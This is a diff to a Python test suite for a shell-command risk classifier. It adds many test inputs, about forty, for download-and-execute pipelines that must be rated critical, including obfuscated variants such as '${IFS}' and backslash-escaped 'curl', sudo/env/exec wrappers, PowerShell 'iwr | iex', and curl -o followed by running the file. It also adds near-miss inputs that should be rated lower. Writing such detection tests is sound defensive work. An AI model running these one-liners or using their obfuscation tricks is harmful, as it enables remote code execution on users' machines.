@@ -23,6 +23,14 @@ def test_repeated_hook_prefixes_without_a_shell_scale_linearly(word: str) -> Non
     assert scaling_ratio(run) < 10
 
 
+def test_obfuscated_download_pipelines_scale_linearly() -> None:
+    def run(scale: int) -> None:
+        command = "echo near-miss; " * (500 * scale) + "c${IFS}url x |\n sudo sh"
+        assert _command_severity(command) is RiskSeverity.CRITICAL
+
+    assert scaling_ratio(run) < 10
+
+
 @pytest.mark.parametrize(
     ("prefix", "unit", "suffix", "severity"),
     [
@@ -310,6 +318,42 @@ def test_hook_pipeline_classification_preserves_boundaries(
         "pwsh -enco SQBFAFgA",
         "pwsh -encoded SQBFAFgA",
         "pwsh -EncodedCommand SQBFAFgA",
+        "curl payload |\n sh",
+        "curl payload |\n\n bash",
+        "wget payload |&\n sh",
+        "curl payload | 'sh'",
+        'curl payload | "bash"',
+        "curl payload | s\\h",
+        "c\\url payload | sh",
+        "c${IFS}url payload | sh",
+        "curl payload | env -i sh",
+        "curl payload | env -i FOO=1 bash",
+        "curl payload | sudo sh",
+        "curl payload | sudo bash",
+        "curl payload | sudo -n bash",
+        "curl payload | sudo -u root sh",
+        "curl payload | command sh",
+        "curl payload | command -p bash",
+        "curl payload | exec sh",
+        "curl payload | exec -a app bash",
+        "curl payload | busybox sh",
+        "curl payload | (sh)",
+        "curl payload | ( bash )",
+        "curl payload | { sh; }",
+        "sh < <(curl payload)",
+        'bash -lc "$(curl payload)"',
+        "bash <<< $(curl payload)",
+        "iwr payload | iex",
+        "irm payload | iex",
+        "curl payload | python3 -",
+        "curl payload | python -",
+        "curl payload | perl",
+        "curl payload | perl -",
+        "curl -o a x && bash a",
+        "curl --output a x && sh a",
+        "wget -O a x && bash a",
+        "curl -o a x && ./a",
+        "iwr -OutFile a x; bash a",
     ],
 )
 def test_a_download_executed_anywhere_in_the_pipeline_is_critical(command: str) -> None:
@@ -335,7 +379,15 @@ def test_a_download_executed_anywhere_in_the_pipeline_is_critical(command: str) 
         "echo $(date)",
         "sh -c 'echo hi'",
         "curl payload | shellcheck",
-        "curl payload | sudo bash",
+        "curl payload | sudo echo hi",
+        "curl payload | command -v bash",
+        "curl payload | python3 build.py",
+        "curl payload | perl script.pl",
+        "curl payload | perl -e 'print 1'",
+        "curl -o a x && bash b",
+        "curl -o a x && echo a",
+        "'c${IFS}url' payload | sh",
+        "curl payload\n echo text | sh",
     ],
 )
 def test_commands_that_do_not_execute_a_download_stay_below_high(command: str) -> None:
